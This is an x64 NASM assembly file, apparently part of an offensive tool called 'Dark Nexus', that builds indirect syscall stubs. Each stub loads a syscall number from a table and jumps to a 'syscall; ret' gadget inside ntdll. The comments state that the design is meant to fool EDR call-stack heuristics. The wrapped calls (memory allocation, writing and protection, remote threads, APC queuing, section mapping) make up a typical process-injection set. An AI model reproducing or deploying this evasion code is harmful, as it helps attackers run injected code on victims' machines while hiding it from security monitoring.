;
; Dark Nexus - Indirect Syscall Stubs (x64 NASM, win64 format)
;
; Each stub:
;   1. Moves the SSN from the global table into eax
;   2. Loads the gadget address (pointer to 'syscall; ret' inside ntdll)
;   3. JMPs to the gadget instead of executing 'syscall' inline
;
; Result: return address on the stack points to ntdll .text,
; not to our module. EDR call-stack heuristics see a legitimate
; ntdll origin for the syscall.
;
; Convention: Windows x64 calling convention.
;   rcx = arg1, rdx = arg2, r8 = arg3, r9 = arg4
;   stack args at rsp+28h, rsp+30h, etc.
;   mov r10, rcx before syscall (kernel expects arg1 in r10)
;

; Import the global syscall table from syscalls.c
extern g_SyscallTable

; Offsets into DN_SYSCALL_TABLE
; Each DN_SYSCALL is 24 bytes: ssn(4) + pad(4) + syscall_addr(8) + resolved(4) + pad(4)
%define DN_SYSCALL_SIZE         24
%define OFF_SSN                 0
%define OFF_GADGET              8

; DN_SYSCALL_TABLE field offsets (entry_index * DN_SYSCALL_SIZE)
%define OFF_NtAllocateVirtualMemory   (0 * DN_SYSCALL_SIZE)
%define OFF_NtWriteVirtualMemory      (1 * DN_SYSCALL_SIZE)
%define OFF_NtProtectVirtualMemory    (2 * DN_SYSCALL_SIZE)
%define OFF_NtCreateThreadEx          (3 * DN_SYSCALL_SIZE)
%define OFF_NtOpenProcess             (4 * DN_SYSCALL_SIZE)
%define OFF_NtClose                   (5 * DN_SYSCALL_SIZE)
%define OFF_NtWaitForSingleObject     (6 * DN_SYSCALL_SIZE)
%define OFF_NtQueryVirtualMemory      (7 * DN_SYSCALL_SIZE)
%define OFF_NtFreeVirtualMemory       (8 * DN_SYSCALL_SIZE)
%define OFF_NtCreateSection           (9 * DN_SYSCALL_SIZE)
%define OFF_NtMapViewOfSection        (10 * DN_SYSCALL_SIZE)
%define OFF_NtUnmapViewOfSection      (11 * DN_SYSCALL_SIZE)
%define OFF_NtQueueApcThread          (12 * DN_SYSCALL_SIZE)
%define OFF_NtResumeThread            (13 * DN_SYSCALL_SIZE)
%define OFF_NtDelayExecution          (14 * DN_SYSCALL_SIZE)

section .text

; Macro: generate an indirect syscall stub
; %1 = function name, %2 = offset of the DN_SYSCALL entry
%macro MAKE_STUB 2
global %1
%1:
    mov     r10, rcx                        ; shadow rcx for kernel
    lea     rax, [rel g_SyscallTable]       ; table base (RIP-relative)
    mov     eax, dword [rax + %2 + OFF_SSN] ; load SSN
    lea     r11, [rel g_SyscallTable]
    mov     r11, qword [r11 + %2 + OFF_GADGET] ; load gadget addr
    jmp     r11                             ; jump to 'syscall; ret' in ntdll
%endmacro

; Generate all stubs
MAKE_STUB DnNtAllocateVirtualMemory,  OFF_NtAllocateVirtualMemory
MAKE_STUB DnNtWriteVirtualMemory,     OFF_NtWriteVirtualMemory
MAKE_STUB DnNtProtectVirtualMemory,   OFF_NtProtectVirtualMemory
MAKE_STUB DnNtCreateThreadEx,         OFF_NtCreateThreadEx
MAKE_STUB DnNtOpenProcess,            OFF_NtOpenProcess
MAKE_STUB DnNtClose,                  OFF_NtClose
MAKE_STUB DnNtWaitForSingleObject,    OFF_NtWaitForSingleObject
MAKE_STUB DnNtFreeVirtualMemory,      OFF_NtFreeVirtualMemory
MAKE_STUB DnNtQueueApcThread,         OFF_NtQueueApcThread
MAKE_STUB DnNtResumeThread,           OFF_NtResumeThread
MAKE_STUB DnNtQueryVirtualMemory,     OFF_NtQueryVirtualMemory
MAKE_STUB DnNtCreateSection,          OFF_NtCreateSection
MAKE_STUB DnNtMapViewOfSection,       OFF_NtMapViewOfSection
MAKE_STUB DnNtUnmapViewOfSection,     OFF_NtUnmapViewOfSection
MAKE_STUB DnNtDelayExecution,         OFF_NtDelayExecution
